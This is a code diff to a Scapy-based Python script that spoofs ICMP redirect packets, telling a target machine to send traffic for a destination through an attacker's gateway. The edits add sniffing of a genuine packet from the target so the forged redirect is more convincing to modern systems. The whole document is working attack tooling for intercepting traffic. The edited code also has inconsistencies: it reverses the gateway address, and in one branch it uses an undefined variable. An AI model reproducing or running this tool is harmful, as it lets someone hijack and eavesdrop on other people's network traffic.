@@ -1,4 +1,4 @@
-from scapy.layers.inet import IP, ICMP, UDP
+from scapy.layers.inet import IP, ICMP, UDP, Ether
 from scapy.sendrecv import send
 import scapy.all as scapy
 import argparse
@@ -44,25 +44,22 @@ ip.dst = args.target
 icmp      = ICMP()
 icmp.type = 5
 icmp.code = args.redirect_code  
-icmp.gw   = args.attacker
+icmp.gw   = '.'.join(args.attacker.split('.')[::-1])
 
 #internet header payload, this can be sniffed instead of manually created for better results against modern OS.
 if args.iface:
-    #build a sniffer, we're going to send a spoofed ICMP packet and then sniff the response
-    send(IP(src=args.destination, dst=args.target)/ICMP())
-    icmp_sniffer = scapy.sniff(iface=args.iface, filter=f"dst host {args.destination} and icmp[icmptype] == icmp-echoreply", prn=process_packet, count=1)
+    # build a sniffer, we're going to send a spoofed ICMP packet and then sniff the response
+    #reply = scapy.sr1(IP(src=args.destination, dst=args.target)/ICMP(type=8, seq=1, id=1), iface=args.iface)
+    print("Sniffing!")
+    req = scapy.sniff(iface=args.iface, filter=f"icmp and src host {args.target}", count=1)
     
-    print(icmp_sniffer)
+    req[0][Ether].payload.show()
 
 else:   
     ip_payload     = IP()
     ip_payload.src = args.target
     ip_payload.dst = args.destination
 
-# 'original data datagram' which is just scapy defaults for UDP(). Look similar to a DNS packet.
-udp = ICMP()
 
 
-
-
-send(ip/icmp/ip_payload/udp)
+send(ip/icmp/req[0].payload)
